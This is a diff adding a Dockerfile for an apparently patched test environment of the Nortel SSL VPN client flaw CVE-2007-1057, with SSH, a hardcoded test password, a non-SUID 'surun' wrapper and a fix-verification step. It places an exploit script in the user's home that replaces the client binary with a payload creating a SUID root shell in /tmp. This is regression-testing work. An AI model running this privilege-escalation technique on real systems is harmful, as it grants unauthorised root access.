@@ -1,0 +1,97 @@
+FROM debian:bookworm-slim
+
+# Install required packages
+RUN apt-get update && apt-get install -y \
+    openssh-server \
+    gcc \
+    libc6-dev \
+    coreutils \
+    passwd \
+    procps \
+    && rm -rf /var/lib/apt/lists/*
+
+# Setup SSH
+RUN mkdir -p /var/run/sshd && \
+    sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config && \
+    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
+    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
+
+# Create low-privilege user
+RUN useradd -m -s /bin/bash testuser && \
+    echo 'testuser:t3stP@ss' | chpasswd
+
+# Create the surun binary - FIXED version without SUID bit
+RUN printf '%s\n' \
+    '#include <stdio.h>' \
+    '#include <stdlib.h>' \
+    '#include <unistd.h>' \
+    '#include <sys/types.h>' \
+    '#include <sys/stat.h>' \
+    '' \
+    '#define CLIENT_PATH "/tmp/NetClient/client"' \
+    '' \
+    'int main(int argc, char *argv[]) {' \
+    '    struct stat st;' \
+    '    if (stat(CLIENT_PATH, &st) != 0) {' \
+    '        fprintf(stderr, "Error: client not found at %s\\n", CLIENT_PATH);' \
+    '        return 1;' \
+    '    }' \
+    '    execl(CLIENT_PATH, "client", NULL);' \
+    '    perror("execl failed");' \
+    '    return 1;' \
+    '}' > /tmp/surun.c
+
+RUN gcc -o /usr/local/bin/surun /tmp/surun.c && \
+    chown root:root /usr/local/bin/surun && \
+    chmod 0755 /usr/local/bin/surun && \
+    rm /tmp/surun.c
+
+# Create the /tmp/NetClient directory with SECURE permissions (fix applied)
+RUN mkdir -p /tmp/NetClient && \
+    chmod 755 /tmp/NetClient
+
+# Create the original "client" binary with secure permissions
+RUN printf '#!/bin/sh\necho "Nortel VPN Client running"\n' > /tmp/NetClient/client && \
+    chmod 755 /tmp/NetClient/client && \
+    chown root:root /tmp/NetClient/client
+
+# Create the exploit script (same as vulnerable, but it will fail)
+RUN cat <<'EXPLOIT_EOF' > /home/testuser/exploit.sh
+#!/bin/sh
+CLIENT="/tmp/NetClient/client"
+SURUN="/usr/local/bin/surun"
+
+echo "[*] CVE-2007-1057 Nortel SSL VPN Client Exploit"
+echo "[*] Attempting to replace client with privilege escalation payload"
+
+cat > "$CLIENT" <<'PAYLOAD' 2>/dev/null
+#!/bin/sh
+cp /bin/sh /tmp/rootshell
+chmod 4755 /tmp/rootshell
+chown root:root /tmp/rootshell
+PAYLOAD
+chmod +x "$CLIENT" 2>/dev/null
+
+echo "[*] Running surun..."
+$SURUN
+
+if [ -u /tmp/rootshell ] 2>/dev/null; then
+    echo "[+] SUCCESS!"
+    exec /tmp/rootshell -p
+else
+    echo "[-] Exploit failed - vulnerability has been patched"
+fi
+EXPLOIT_EOF
+
+RUN chown testuser:testuser /home/testuser/exploit.sh && \
+    chmod +x /home/testuser/exploit.sh
+
+# Verify the fix: no SUID on surun, client not world-writable
+RUN ls -la /usr/local/bin/surun && \
+    test ! -u /usr/local/bin/surun && \
+    echo "SUID bit NOT set on surun (FIXED)" && \
+    ls -la /tmp/NetClient/client && \
+    echo "Secure permissions confirmed"
+
+EXPOSE 22
+CMD ["/usr/sbin/sshd", "-D"]
